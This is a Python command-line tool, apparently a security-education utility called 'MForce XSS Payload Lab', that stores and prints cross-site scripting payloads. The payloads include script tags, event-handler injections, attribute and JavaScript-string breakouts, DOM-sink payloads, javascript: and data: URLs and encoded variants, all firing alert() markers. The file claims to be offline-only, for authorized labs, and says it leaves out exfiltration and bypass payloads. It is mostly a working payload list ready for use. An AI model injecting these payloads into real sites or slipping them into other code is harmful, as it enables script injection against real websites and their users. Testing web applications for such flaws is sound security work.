#!/usr/bin/env python3
"""MForce XSS Payload Lab — local payload library for authorized security education.

This command NEVER sends payloads to a target. Use only in controlled labs.
"""
from __future__ import annotations

import argparse
import json
import sys
from dataclasses import asdict, dataclass
from pathlib import Path


@dataclass(frozen=True)
class Payload:
    category: str
    context: str
    payload: str
    note: str


# Deliberately excludes obfuscated, stealth, exfiltration and filter-bypass payloads.
# Distinct, realistic, executable proof-of-concept payloads for local labs.
SEEDS = [
    Payload("html", "HTML element", "<script>alert(1)</script>", "Basic script element"),
    Payload("html", "HTML element", "<img src=x onerror=alert(1)>", "Image error event"),
    Payload("html", "HTML element", "<svg onload=alert(1)>", "SVG load event"),
    Payload("html", "HTML element", "<details open ontoggle=alert(1)>", "Details toggle event"),
    Payload("html", "HTML element", "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "Inline iframe document"),
    Payload("html", "HTML element", "<a href=\"javascript:alert(1)\">click</a>", "User-clicked JavaScript URL"),
    Payload("html", "HTML element", "<button onclick=\"alert(1)\">click</button>", "User-clicked event handler"),
    Payload("attribute", "Double-quoted attribute", "\" onmouseover=\"alert(1)", "Break out of double quotes"),
    Payload("attribute", "Single-quoted attribute", "' onmouseover='alert(1)", "Break out of single quotes"),
    Payload("attribute", "Double-quoted attribute", "\"><img src=x onerror=alert(1)>", "Close attribute and add element"),
    Payload("attribute", "Single-quoted attribute", "'><svg onload=alert(1)>", "Close attribute and add SVG"),
    Payload("attribute", "Unquoted attribute", " onfocus=alert(1) autofocus ", "Unquoted attribute with focus"),
    Payload("javascript", "Single-quoted JS string", "';alert(1);//", "Terminate JS string"),
    Payload("javascript", "Double-quoted JS string", "\";alert(1);//", "Terminate JS string"),
    Payload("javascript", "Template literal", "${alert(1)}", "Template literal interpolation"),
    Payload("javascript", "Script tag context", "</script><script>alert(1)</script>", "Close script element"),
    Payload("dom", "innerHTML sink", "<img src=x onerror=alert(1)>", "Requires unsafe HTML sink"),
    Payload("dom", "outerHTML sink", "<svg onload=alert(1)>", "Requires unsafe HTML sink"),
    Payload("dom", "document.write sink", "<script>alert(1)</script>", "Requires document.write"),
    Payload("dom", "insertAdjacentHTML sink", "<img src=x onerror=alert(1)>", "Requires unsafe HTML sink"),
    Payload("url", "javascript: link", "javascript:alert(1)", "Only in unsafe navigable URL context"),
    Payload("url", "data: URL", "data:text/html,<script>alert(1)</script>", "May be blocked by browser policies"),
    Payload("encoding", "HTML entities", "&lt;script&gt;alert(1)&lt;/script&gt;", "Encoded text is inert unless decoded unsafely"),
    Payload("encoding", "URL-encoded HTML", "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "Encoded until decoded into HTML"),
    Payload("encoding", "Escaped Unicode", r"\u003cscript\u003ealert(1)\u003c/script\u003e", "Requires unsafe decoding"),
]


def library() -> list[Payload]:
    """Include distinct benign marker variants for contextual lab comparisons."""
    results: list[Payload] = []
    for seed in SEEDS:
        results.append(seed)
        # Multiple alert arguments help compare quoting and interpolation behavior.
        # These are NOT WAF bypass variants; no network activity is performed.
        for number in (2, 3, 4):
            results.append(Payload(
                seed.category, seed.context,
                seed.payload.replace("alert(1)", f"alert({number})"),
                seed.note + f" / lab marker {number}",
            ))
    return results


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Offline XSS payload reference library for owned lab environments"
    )
    parser.add_argument("--category", choices=sorted({x.category for x in SEEDS}))
    parser.add_argument("--search", help="Filter payloads and descriptions by text")
    parser.add_argument("--format", choices=("text", "json", "lines"), default="text")
    parser.add_argument("--output", type=Path, help="Write to local file (never uploads)")
    parser.add_argument("--list-categories", action="store_true")
    args = parser.parse_args(argv)
    if args.list_categories:
        print("\n".join(sorted({x.category for x in SEEDS})))
        return 0
    items = library()
    if args.category:
        items = [x for x in items if x.category == args.category]
    if args.search:
        query = args.search.casefold()
        items = [x for x in items if query in " ".join(asdict(x).values()).casefold()]
    if args.format == "json":
        output = json.dumps({"count": len(items), "payloads": [asdict(x) for x in items]}, indent=2)
    elif args.format == "lines":
        output = "\n".join(x.payload for x in items)
    else:
        header = "MFORCE / XSS PAYLOAD LAB / OFFLINE ONLY\nEducational Purpose · Professional Usage · Authorized Labs\n"
        output = header + "\n".join(
            f"\n[{index:03}] {item.category.upper()} | {item.context}\n"
            f"  {item.payload}\n  {item.note}"
            for index, item in enumerate(items, 1)
        )
    if args.output:
        args.output.write_text(output + "\n", encoding="utf-8")
        print(f"Exported {len(items)} lab payloads to {args.output}")
    else:
        print(output)
    return 0


if __name__ == "__main__":
    sys.exit(main())
